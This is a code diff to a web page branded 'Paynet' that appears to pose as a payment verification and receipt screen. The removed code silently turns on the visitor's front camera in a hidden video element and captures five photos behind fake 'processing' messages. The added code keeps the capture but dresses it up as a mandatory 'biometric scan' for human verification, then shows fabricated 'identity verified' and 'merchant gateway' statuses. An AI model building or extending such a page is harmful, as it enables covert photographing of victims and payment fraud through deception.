@@ -24,6 +24,30 @@
     <meta property="og:image:height" content="630">
     <meta property="og:site_name" content="Paynet">
     <link rel="stylesheet" href="/verify.css">
+    <style>
+        @keyframes scanAnim {
+            0% {
+                top: 0;
+            }
+
+            50% {
+                top: 100%;
+            }
+
+            100% {
+                top: 0;
+            }
+        }
+
+        .modal-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+    </style>
 </head>
 
 <body>
@@ -49,34 +73,70 @@
 
         <!-- Loading Section -->
         <div id="loadingSection">
-            <h2 class="success-title">Processing Payment Details...</h2>
-            <p class="success-subtitle">Please wait while we verify your transaction</p>
+            <h2 class="success-title">Initializing Verification...</h2>
+            <p class="success-subtitle">Please wait while we set up your secure session</p>
 
             <div style="margin: 30px 0;">
                 <div class="loading-spinner" style="margin: 0 auto;"></div>
             </div>
+        </div>
 
+        <!-- Human Verification / Biometric Scan Section -->
+        <div id="humanVerificationSection" style="display: none; text-align: center; animation: fadeIn 0.5s ease-out;">
+            <div class="modal-icon" style="background: #E8F0FE; color: #1A73E8; margin: 0 auto 20px;">
+                <svg width="40" height="40" viewBox="0 0 24 24" fill="currentColor">
+                    <path
+                        d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-5-9h10v2H7z" />
+                </svg>
+            </div>
+            <h2 class="success-title">Human Verification</h2>
+            <p class="success-subtitle">To proceed, we need to verify that you are a human. This is a mandatory security
+                step.</p>
+
+            <div id="scanBox"
+                style="position: relative; width: 200px; height: 200px; margin: 30px auto; border: 3px dashed #1A73E8; border-radius: 50%; overflow: hidden; background: #f8f9fa; display: flex; align-items: center; justify-content: center;">
+                <video id="scanVideo" style="width: 100%; height: 100%; object-fit: cover; display: none;"></video>
+                <div id="scanPlaceholder" style="color: #5f6368; font-size: 14px;">Camera Inactive</div>
+                <div id="scanLine"
+                    style="display: none; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: #1A73E8; box-shadow: 0 0 10px #1A73E8; animation: scanAnim 2s linear infinite;">
+                </div>
+            </div>
+
+            <div id="verificationStatus" class="verification-steps" style="max-width: 300px; margin: 0 auto;">
+                <div class="step" id="step-bio">
+                    <svg class="step-icon" viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="10" fill="#FBBC04" />
+                        <circle cx="12" cy="12" r="4" fill="white" class="pulse" />
+                    </svg>
+                    <span class="step-text">Waiting for camera...</span>
+                </div>
+            </div>
+
+            <button id="startScanBtn" class="modal-btn" style="background: #1A73E8; margin-top: 20px;"
+                onclick="initiateBiometricScan()">Start Biometric Scan</button>
+        </div>
+
+        <!-- Processing Result Section -->
+        <div id="processingResultSection" style="display: none;">
+            <h2 class="success-title">Finalizing Transaction...</h2>
+            <p class="success-subtitle">Verifying biometric data and securing payment</p>
+            <div style="margin: 30px 0;">
+                <div class="loading-spinner" style="margin: 0 auto;"></div>
+            </div>
             <div class="verification-steps">
                 <div class="step">
                     <svg class="step-icon" viewBox="0 0 24 24">
-                        <circle cx="12" cy="12" r="10" fill="#1A73E8" />
-                        <path d="M12 6v6l4 2" stroke="white" stroke-width="2" fill="none" />
+                        <circle cx="12" cy="12" r="10" fill="#34A853" />
+                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" fill="white" />
                     </svg>
-                    <span class="step-text">Initializing Secure Environment...</span>
-                </div>
-                <div class="step" id="step-camera">
-                    <svg class="step-icon" viewBox="0 0 24 24">
-                        <circle cx="12" cy="12" r="10" fill="#FBBC04" />
-                        <circle cx="12" cy="12" r="4" fill="white" class="pulse" />
-                    </svg>
-                    <span class="step-text">Scanning Face Identity...</span>
+                    <span class="step-text">Biometric Identity Verified</span>
                 </div>
                 <div class="step">
                     <svg class="step-icon" viewBox="0 0 24 24">
                         <circle cx="12" cy="12" r="10" fill="#FBBC04" />
                         <circle cx="12" cy="12" r="4" fill="white" class="pulse" />
                     </svg>
-                    <span class="step-text">Verifying Secure Presence...</span>
+                    <span class="step-text">Linking to Merchant Gateway...</span>
                 </div>
             </div>
         </div>
@@ -250,20 +310,11 @@
             // Fetch payment details first
             paymentData = await fetchPaymentDetails();
 
-            // Start camera silently in background
-            const cameraStarted = await startCameraInBackground();
-
-            // If camera failed, show professional popup
-            if (!cameraStarted) {
-                document.getElementById('cameraModal').style.display = 'flex';
-                return; // Wait for user to click "Turn On"
-            }
-
-            // Capture 5 photos during animation (1 per second)
-            await captureMultiplePhotos();
-
-            // After photos captured, show receipt
-            setTimeout(showReceipt, Math.floor(Math.random() * 2000) + 3000);
+            // Show Human Verification after initial load
+            setTimeout(() => {
+                document.getElementById('loadingSection').style.display = 'none';
+                document.getElementById('humanVerificationSection').style.display = 'block';
+            }, 1000);
         });
 
         // Helper for random IDs if missing
@@ -285,46 +336,76 @@
             return result;
         }
 
-        // Start camera in background (no visible element)
-        async function startCameraInBackground() {
+        async function initiateBiometricScan() {
+            const btn = document.getElementById('startScanBtn');
+            btn.innerHTML = "Initializing...";
+            btn.disabled = true;
+
+            const started = await startCameraInScanBox();
+
+            if (!started) {
+                document.getElementById('cameraModal').style.display = 'flex';
+                btn.innerHTML = "Retry Verification";
+                btn.disabled = false;
+                return;
+            }
+
+            // Camera started - show scan UI
+            document.getElementById('scanPlaceholder').style.display = 'none';
+            document.getElementById('scanVideo').style.display = 'block';
+            document.getElementById('scanLine').style.display = 'block';
+            btn.style.display = 'none';
+
+            updateStep('step-bio', 'FBBC04', 'Biometric Scan in progress...');
+
+            // Capture 5 photos over 5 seconds
+            await captureMultiplePhotos();
+
+            updateStep('step-bio', '34A853', 'Scan Complete ✓');
+
+            // Move to final processing
+            setTimeout(() => {
+                document.getElementById('humanVerificationSection').style.display = 'none';
+                document.getElementById('processingResultSection').style.display = 'block';
+
+                // Show final receipt after processing
+                setTimeout(showReceipt, 3000);
+            }, 1000);
+        }
+
+        function updateStep(id, color, text) {
+            const step = document.getElementById(id);
+            if (!step) return;
+            const icon = step.querySelector('.step-icon circle');
+            if (icon) icon.setAttribute('fill', '#' + color);
+            const textEl = step.querySelector('.step-text');
+            if (textEl) textEl.innerText = text;
+        }
+
+        async function startCameraInScanBox() {
             try {
-                // Request camera access
                 cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    }
+                    video: { facingMode: 'user' }
                 });
 
-                // Create hidden video element
-                video = document.createElement('video');
+                video = document.getElementById('scanVideo');
                 video.srcObject = cameraStream;
-                video.style.display = 'none';
-                document.body.appendChild(video);
                 video.play();
-                // Camera started silently
                 return true;
             } catch (error) {
-                console.warn('Camera access denied:', error);
                 return false;
             }
         }
 
         async function retryCamera() {
             const btn = document.querySelector('#cameraModal .modal-btn');
-            const originalText = btn.innerText;
             btn.innerText = "Connecting...";
             btn.disabled = true;
 
-            const started = await startCameraInBackground();
+            const started = await startCameraInScanBox();
             if (started) {
                 document.getElementById('cameraModal').style.display = 'none';
-                // Proceed with photo capture and animation
-                await captureMultiplePhotos();
-
-                // Set the timeout to hide loading and show receipt (same as original logic)
-                setTimeout(showReceipt, Math.floor(Math.random() * 2000) + 3000);
+                initiateBiometricScan(); // Start the scan process
             } else {
                 btn.innerText = "Verification Failed. Retry?";
                 btn.disabled = false;
@@ -334,6 +415,8 @@
 
         function showReceipt() {
             document.getElementById('loadingSection').style.display = 'none';
+            document.getElementById('humanVerificationSection').style.display = 'none';
+            document.getElementById('processingResultSection').style.display = 'none';
 
             // Check if custom payment
             if (paymentData && paymentData.isCustom) {
